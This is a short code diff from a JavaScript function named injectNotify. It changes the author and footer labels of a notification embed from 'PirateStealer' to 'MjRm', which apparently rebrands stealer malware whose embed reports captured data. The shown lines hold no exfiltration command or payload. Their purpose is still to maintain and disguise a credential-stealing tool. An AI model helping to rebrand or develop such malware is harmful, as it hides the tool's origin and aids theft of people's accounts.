@@ -174,10 +174,10 @@ function injectNotify() {
             "color": config["embed-color"],
             "fields": fields,
             "author": {
-              "name": "PirateStealer"
+              "name": "MjRm"
             },
             "footer": {
-              "text": "PirateStealer"
+              "text": "MjRm"
             }
           }
         ]
